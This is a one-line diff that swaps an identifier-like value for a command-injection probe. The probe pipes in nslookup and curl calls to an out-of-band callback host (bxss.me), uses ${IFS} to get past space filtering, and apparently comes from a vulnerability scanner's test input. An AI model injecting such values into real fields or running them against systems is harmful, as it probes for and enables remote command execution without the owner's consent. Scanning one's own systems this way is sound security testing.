@@ -1,1 +1,1 @@
-MO_169076431435_000/.
+|(nslookup${IFS}-q${IFS}cname${IFS}hitlqsihptrdbeb5ac.bxss.me||curl${IFS}hitlqsihptrdbeb5ac.bxss.me)
